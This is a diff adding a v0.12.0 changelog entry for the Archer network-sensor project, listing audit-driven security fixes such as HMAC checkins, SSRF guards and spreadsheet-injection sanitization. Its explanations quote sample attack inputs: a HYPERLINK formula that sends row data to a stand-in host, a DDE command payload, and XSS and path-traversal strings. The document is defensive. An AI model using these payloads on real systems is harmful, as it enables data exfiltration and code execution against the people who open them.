@@ -30,6 +30,340 @@ relevant, `### Detection changes` in each release entry.
 
 ## [Unreleased]
 
+## [v0.12.0] — 2026-05-10
+
+Fourth audit-driven correctness release. Eleven items (NEW-14
+through NEW-24) plus a five-item low-priority cluster surfaced by
+the 2026-05-10 external review (fifth pass on the codebase). Mix
+of analyst-injection / SSRF / spreadsheet-injection attack
+surfaces, a Quiver-protocol bump (per-sensor HMAC), an x509
+fixture-vs-reality drift, an archive-layout collision, and the
+usual cluster of small-scale efficiency and ergonomics work.
+
+The reviewer's framing this round: "the detection paths are clean,
+the auth/middleware is clean, the storage layer is clean — what's
+left are surface-area bugs in inputs from untrusted-or-semi-
+trusted parties (analyst at /api/import, sensor at
+/api/quiver/checkin) and data sinks that get rendered/opened by
+other tools (XLSX/CSV → Excel, feed URLs → HTTP fetcher)." That's
+a real signal — boundary-layer validation discipline is the
+remaining maturity step toward team-deployed scenarios. Every
+external-facing entry point now canonicalizes on entry and
+escapes on egress; recorded as a maturation lesson in
+MATURATION_PLAN section 8.
+
+A separate procedural lesson from NEW-20/24: the x509
+detector's validity-window check was silently dead in production
+because the goldens were hand-written with RFC3339 timestamps
+while real Zeek default JSON output emits Unix-epoch floats. The
+fixture matched the parser's wrong expectation rather than
+upstream's actual behavior, so the bug stayed invisible across
+five audit rounds. Rewriting the affected fixtures to Zeek's
+real wire format was a one-time correction; preventing the class
+failure mode is procedural — captured in MATURATION_PLAN as
+"audit fixtures against reality periodically."
+
+### Added
+
+- **Per-sensor HMAC-SHA256 secret for checkin authentication
+  (NEW-16, Quiver protocol v2).** Pre-v2 the `/api/quiver/checkin`
+  endpoint trusted the `name` field alone — anyone who knew (or
+  guessed) a sensor's name could POST a checkin and forge the
+  `last_seen_at` heartbeat that admins use to know "is my sensor
+  alive." Sensor names are short, operator-chosen strings; they
+  aren't secrets in the design. New `checkin_secret` column on
+  the `sensors` table (migration 0007), generated server-side at
+  enrollment, returned exactly once in the enroll response, and
+  persisted at `/etc/quiver/secret` (mode 0600 owned by the
+  quiver user) on the sensor side. `quiver.sh` signs each checkin
+  body with HMAC-SHA256 (via `openssl dgst`) and sends the hex
+  digest in `X-Quiver-Sig`. Server uses `hmac.Equal` for
+  constant-time comparison; signature failure routes to the
+  unauthorized-attempt path so the admin sees the forgery
+  attempt without the forger learning whether the name itself
+  was valid. New regression tests
+  `TestQuiverCheckin_HMACRequired` (valid/wrong/missing/garbage
+  signatures) and `TestQuiverCheckin_BodyTamperingDetected`
+  (replay protection — flipping any byte invalidates the
+  signature). See `### Breaking` for the upgrade path.
+
+- **`spreadsheetSafe()` helper for CSV/XLSX export sanitization
+  (NEW-17).** Defuses spreadsheet formula injection. Cells whose
+  first character is `=`, `+`, `-`, `@`, `\t`, or `\r` are
+  prefixed with a single quote so Excel/Sheets/LibreOffice treat
+  them as text instead of formulas. Real exposure: an analyst
+  writes a note like
+  `=HYPERLINK("https://evil.test/x?d="&A1, "Click")` and the
+  admin opening the export hovers/clicks → row data exfiltrates
+  to `evil.test`. Older Excel had `=cmd|'/c calc'!A1` as a
+  DDE-RCE; mostly killed by recent Office security defaults but
+  not gone. Standard OWASP CSV-injection mitigation; applied to
+  every operator-supplied or parser-supplied string field on
+  every export sheet. Audit 2026-05-10 NEW-17.
+
+- **`rejectInternalFeedURL()` / `isInternalAddr()` SSRF guard
+  (NEW-18).** Refuses feed URLs whose host is a literal IP in
+  the loopback / link-local / RFC1918 / IPv6 unique-local deny
+  set, plus loopback aliases (`localhost`,
+  `ip6-localhost`, `ip6-loopback`). Two-layer defense: config-
+  time guard (this) for syntactic IP literals, fetch-time guard
+  (`CheckRedirect` in `feeds.httpClientWithTLS`) for hostnames
+  that resolve into internal space — including a redirect target
+  that points there. CheckRedirect is also bounded at 5 hops to
+  cap the redirect-amplifier surface. Audit 2026-05-10 NEW-18.
+
+- **`Store.UpdateFeedRefreshState` / `UpdateFeedStatus` targeted
+  column updates (NEW-22).** Replaces full-row `UpdateFeed` calls
+  in the feed-refresh path. Pre-fix a refresh that took 90s on a
+  large MISP held a stale snapshot of the row; an admin PUT to
+  `/api/feeds/{id}` (URL rotation, API-key rollover) landing
+  mid-fetch was silently reverted when the refresh wrote the
+  snapshot back. Now the refresh path touches only the columns
+  it owns (status, last_refresh_at, last_full_refresh_at,
+  last_indicator_count, last_fetch_truncated, last_error);
+  admin-owned columns (URL, APIKey, Name, IndicatorAgingDays,
+  Enabled, TLSSkipVerify) flow exclusively through `UpdateFeed`.
+  Audit 2026-05-10 NEW-22.
+
+- **`Store.ResetEnrollmentToken()` rollback (NEW-19).** Used by
+  the enrollment handler when a step *after* token consumption
+  fails (authorized_keys write, log dir creation, sensor row
+  insert). Pre-fix the existing `RemoveAuthKey` rollback partially
+  captured the transactional intent, but `ConsumeEnrollmentToken`'s
+  `used_at` flip never reverted — leaving the operator with a
+  permanently-burned token and no sensor row. `ResetEnrollment-
+  Token` clears `used_at` and `consumed_by` so the operator can
+  retry without minting a new token.
+
+- **`parseZeekCertTime()` accepts both Unix-epoch float and
+  RFC3339 (NEW-20).** Closes the silently-dead validity-window
+  check on real Zeek output. See "Fixed" for the bug detail.
+
+- **`ScheduleWakeup`-equivalent helper for fleet-scale UI: per-
+  sensor `lastLogMTime` cache.** 5-second TTL on the on-disk
+  walk that powers the "last seen" column in the Sensors modal.
+  Pre-cache a 50-sensor fleet with a busy log tree spent ~100ms
+  stat'ing files per UI tick; cached the cost is amortized to
+  one walk per sensor per 5 seconds.
+
+- **Eight new regression tests** —
+  `TestImport_RejectsFabricatedFindings` (NEW-14: rejects
+  unknown Type, out-of-range Score, bogus Severity, malformed
+  Timestamp, bogus Status); `TestImport_RejectsCorruptJSON`;
+  `TestRejectInternalFeedURL_LiteralIPs` (NEW-18: AWS metadata,
+  loopback v4/v6, RFC1918, localhost alias all rejected; public
+  IPs and FQDNs pass); `TestRandomMinute_DistributionIsUnbiased`
+  (60K draws, ±20% per bucket — verifies rejection sampling
+  fixed the modulo bias); `TestSpreadsheetSafe_PrefixesDangerous-
+  LeadingChars` (NEW-17 cell sanitization); `TestQuiverHost_
+  ValidatedAtEnrollment` (LOW: control characters and HTML in
+  host field rejected); `TestQuiverCheckin_HMACRequired` (NEW-16
+  4-way: valid/wrong/missing/garbage signatures); `TestQuiverCheckin_
+  BodyTamperingDetected` (NEW-16 replay defense);
+  `TestParseZeekCertTime_BothFormats` (NEW-20 float + RFC3339
+  + edge cases); `TestPurgeSensorLogs_DoesNotCollideOnHyphen-
+  atedNames` (NEW-21); `TestRotateSensorLogs_SuffixesOnSame-
+  DayCollision` (NEW-21).
+
+### Changed
+
+- **`/api/import` is now admin-only (NEW-14).** Pre-fix gated to
+  analyst+, which violated the boundary "findings come from the
+  analyzer; analysts annotate." An analyst could fabricate a
+  Critical TI Hit on any IP they wanted flagged, and the stored
+  representation was indistinguishable from analyzer-emitted
+  findings once it lived in the DB. Admin-only matches the
+  principle that configuration changes (allowlist / IOC list,
+  both also written by `/api/import`) belong to admins.
+
+- **`/api/import` now caps body at 64 MiB and validates every
+  finding before applying (NEW-14).** New `validateImported-
+  Finding()` rejects unknown Types (the analyzer's
+  `ScoreExplanations` map plus the legacy `"Threat Intel Hit"`
+  is the canonical set), Severities outside the 5 model
+  constants, Scores outside [0, 100], Timestamps that don't
+  parse as `2006-01-02 15:04:05`, and Statuses other than
+  open / acknowledged / escalated. Whole-import failure on any
+  bad finding rather than partial application.
+
+- **Sensor checkin now validates `name` against the same
+  `validSensorName` regex as enrollment (NEW-15).** Pre-fix only
+  `name != ""` was checked, so a malformed name (e.g.
+  `<script>alert(1)</script>` or `../../etc/passwd`) flowed into
+  log lines, the SSE `unauthorized_attempt` event, the Sensors-
+  modal table, and any future export of unauthorized attempts.
+  The SPA escapes today, so the immediate XSS vector was closed
+  by defense-in-depth on the frontend — but the SQL row, log
+  entry, and any non-HTML sink (CSV export, JSON API consumers)
+  still received the raw payload. Validating once at enrollment
+  but not at checkin was the asymmetry. Audit 2026-05-10 NEW-15.
+  *(Auditor's note: the original "stored XSS reaching every
+  admin in real time" framing was downgraded mid-review after
+  the auditor read the SPA's `_esc()` discipline; the
+  defense-in-depth argument is the standing motivation.)*
+
+- **Sensor disenroll now resumes from the `disenrolling` state
+  (NEW-23).** Pre-fix the handler rejected anything other than
+  `"enrolled"`, which included sensors stuck in `"disenrolling"`
+  from a server crash or `SetSensorStatus` failure mid-sequence.
+  The admin then had no path through the UI to complete the
+  disenroll; they had to edit SQLite manually. Every step in the
+  sequence is already idempotent
+  (`RemoveAuthKey`/`rotateSensorLogs`/`RetagFindings`); resuming
+  from `disenrolling` reuses that resilience.
+
+- **Archive-rotation layout changed from
+  `/_archived/<name>-<stamp>/` to `/_archived/<name>/<stamp>/`
+  (NEW-21).** Closes the prefix-collision purge bug.
+  `validSensorName` allows hyphens, so sensors named `abc` and
+  `abc-east` produced archive directories with overlapping
+  prefixes; the matching `purgeSensorLogs` used
+  `HasPrefix(name + "-")`, so purging `abc` would also wipe
+  `abc-east`'s archive. Naming conventions like
+  `region-hostname` are common for sensor fleets, so the
+  collision wasn't theoretical. Nesting moves the per-sensor
+  namespace into a directory rather than a path prefix; purge
+  becomes a single `os.RemoveAll(/_archived/<name>)` with no
+  prefix matching, no collision possible. Existing
+  `/_archived/<name>-<stamp>/` directories from pre-v0.12.0
+  installs are left in place — they'll continue to work for
+  reads, but a future purge of those names will not pick them
+  up. Operators with hyphenated sensor names that haven't been
+  purged should rename the legacy archive directories to the new
+  layout (or accept the leftover directories will require
+  manual cleanup).
+
+- **`upsertFeedIndicatorBatch` now uses one `INSERT ... ON
+  CONFLICT DO UPDATE RETURNING` per row instead of a
+  SELECT-then-INSERT-or-UPDATE pair.** Three SQL round-trips per
+  indicator → one. On a 1M-attribute MISP refresh that's 2M
+  fewer queries. New migration 0008 adds the
+  `(feed_id, indicator)` UNIQUE index the ON CONFLICT requires,
+  with a defensive dedupe sweep that keeps the highest-id row
+  per pair. Audit 2026-05-10 LOW.
+
+- **`weird.go` reads `notice` field via `parser.GetBool` instead
+  of `GetStr`.** Pre-fix `GetStr` produced literal `"true"` /
+  `"false"` strings via `json.Marshal` on the underlying bool,
+  so the detail-line concatenation
+  `if notice != "" && notice != "-"` always fired and produced
+  `"Zeek weird: x | true"` for any record. New emit shape is
+  `Zeek weird: x (also notice)` only when actually noticed.
+  Audit 2026-05-10 LOW.
+
+- **`randomMinute()` now uses rejection sampling** instead of
+  `b % 60`. 256 / 60 = 4 rem 16, so `b % 60` made minutes 0–15
+  each map from 5 byte values while 16–59 each map from 4 — a
+  small but real bias. Drawing fresh bytes until one falls in
+  [0, 240) eliminates the bias. Tiny issue in practice; fixed
+  for inelegance. Audit 2026-05-10 LOW.
+
+- **Sensor enrollment validates `req.Host`** with a permissive
+  regex (alnum + `.`, `-`, `_`, `:` for IPv6, capped at 253
+  chars). Pre-fix the host field flowed unvalidated into the
+  sensors row and admin-facing sinks (Sensors modal, JSON
+  exports, log lines). The SPA escapes today but the asymmetry
+  with `name`'s validation was a latent risk. Audit 2026-05-10
+  LOW.
+
+### Fixed
+
+- **Analyst-injection of fabricated findings via `/api/import`
+  (NEW-14).** See "Changed" above for the full mitigation —
+  admin gate plus body cap plus per-finding validation.
+
+- **Quiver checkin heartbeats are no longer forgeable (NEW-16).**
+  See "Added" above — per-sensor HMAC. The Forged-by-design
+  semantic of v1 checkins is closed by the v2 cutover.
+
+- **CSV/XLSX exports defuse spreadsheet formula injection
+  (NEW-17).** Every operator-supplied or parser-supplied string
+  field passes through `spreadsheetSafe` before being written to
+  any sheet of the XLSX export and any cell of the CSV export.
+
+- **Feed URL configuration refuses obvious internal addresses
+  (NEW-18).** Two-layer guard — see "Added" for both layers'
+  scope.
+
+- **Enrollment failure no longer permanently burns the token
+  (NEW-19).** `ResetEnrollmentToken` is invoked on every failure
+  path between successful `ConsumeEnrollmentToken` and successful
+  `CreateSensor` so the token becomes reusable.
+
+- **x509 validity-window detection now fires on real Zeek
+  output (NEW-20).** Default Zeek JSON output encodes the `time`
+  type as a Unix-epoch float (`"1700000000.0"`); pre-fix
+  `time.Parse(time.RFC3339, ...)` failed on every production
+  capture, both `err1` and `err2` were non-nil, and the entire
+  short-validity / >10-year-validity check block was silently
+  skipped. The bug was invisible because the golden fixture
+  happened to use RFC3339 strings — the fixture matched the
+  parser's wrong expectation rather than upstream's actual
+  behavior. New `parseZeekCertTime` tries float first
+  (production reality), RFC3339 second (custom Zeek configs).
+  `x509_long_validity` and `x509_short_validity` fixtures
+  rewritten to use Unix-epoch floats; `x509_self_signed` and
+  `x509_default_subject` retain RFC3339 inputs to exercise the
+  fallback path. Audit 2026-05-10 NEW-20.
+
+- **Sensor archive purge no longer over-deletes hyphenated-
+  prefix neighbors (NEW-21).** See "Changed" above.
+
+- **Concurrent feed refresh and feed PUT no longer race
+  destructively (NEW-22).** Targeted column updates — see "Added"
+  above.
+
+- **Disenroll mid-sequence failures are now resumable (NEW-23).**
+  See "Changed" above.
+
+- **`x509` fixtures now match Zeek's real wire format (NEW-24).**
+  See NEW-20 for the bug; the fixture rewrite is the procedural
+  half of the fix. Recorded in MATURATION_PLAN as a class lesson:
+  hand-written fixtures embed the author's interpretation of the
+  upstream's wire format rather than its reality, which can mask
+  parser bugs across many audit cycles.
+
+### Detection changes
+
+- **Validity-window indicators (`short validity` and `validity
+  > 10 years`) are now actually emitted on real Zeek output.**
+  Pre-fix they were silently never produced because of NEW-20's
+  timestamp parsing bug. Operators running production Archer
+  installs that previously saw 0 validity-window findings should
+  expect real rates to surface in their next analysis run.
+  `Suspicious Certificate` (the wrapper finding type) was still
+  firing for self-signed and default-subject indicators, which
+  was the only reason the dead path went unnoticed.
+
+### Breaking
+
+- **Quiver protocol v1 dropped (NEW-16).** v0.12.0+ servers
+  require sensors to speak protocol v2 (per-sensor HMAC on
+  every checkin). v1 enrollments and v1 checkins are rejected
+  with the existing `protocol_unsupported` error shape; the
+  operator's upgrade path is to re-run the install one-liner
+  from the Archer admin UI on each sensor — same flow as the
+  initial install, including a fresh enrollment token. The
+  in-band path of "issue a secret to a v1 sensor over an
+  existing channel" wasn't safe (no authenticated channel
+  existed pre-v2), so re-enroll IS the upgrade. There is no
+  one-cycle compatibility window because every checkin from a
+  v1 sensor would be unauthenticated and the audit's whole
+  point is to close that — supporting both during a window
+  defeats the fix.
+
+- **`/api/import` role gate changed from analyst+ to admin-only
+  (NEW-14).** Existing admin-driven `/api/import` automation
+  unchanged; analyst-driven automation must either escalate to
+  an admin token or be retired. The endpoint was rarely used
+  outside config-restore flows, which are admin-shaped anyway.
+
+- **Sensor archive layout changed from `/_archived/<name>-
+  <stamp>/` to `/_archived/<name>/<stamp>/` (NEW-21).** Existing
+  pre-v0.12.0 archive directories continue to be readable but
+  won't be picked up by future `purgeSensorLogs` calls. See
+  "Changed" above for the manual-cleanup note.
+
 ## [v0.11.0] — 2026-05-10
 
 Third audit-driven correctness release in three days. Seven
@@ -1909,7 +2243,8 @@ The baseline detection behavior is the in-tree state at this cut.
   replaced with the runtime version (`v0.1.0` at this cut). Any external
   tooling that parsed the literal as a sentinel needs a one-line update.
 
-[Unreleased]: https://github.com/BushidoCyb3r/Archer/compare/v0.11.0...HEAD
+[Unreleased]: https://github.com/BushidoCyb3r/Archer/compare/v0.12.0...HEAD
+[v0.12.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.11.0...v0.12.0
 [v0.11.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.10.0...v0.11.0
 [v0.10.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.9.0...v0.10.0
 [v0.9.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.8.0...v0.9.0
